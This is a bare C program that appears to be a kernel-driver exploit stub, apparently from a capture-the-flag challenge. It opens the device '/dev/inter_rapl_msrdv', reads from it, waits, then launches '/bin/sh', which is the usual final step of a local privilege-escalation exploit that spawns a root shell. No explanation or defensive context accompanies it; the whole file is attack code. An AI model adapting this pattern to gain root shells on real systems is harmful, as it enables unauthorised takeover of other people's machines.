#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(void)
{
    int fd = open("/dev/inter_rapl_msrdv", O_RDWR);
    // printf("%d", fd);
    char *buf = (char *)malloc(10);
    read(fd, buf, 4);
    sleep(1);
    system("/bin/sh");
}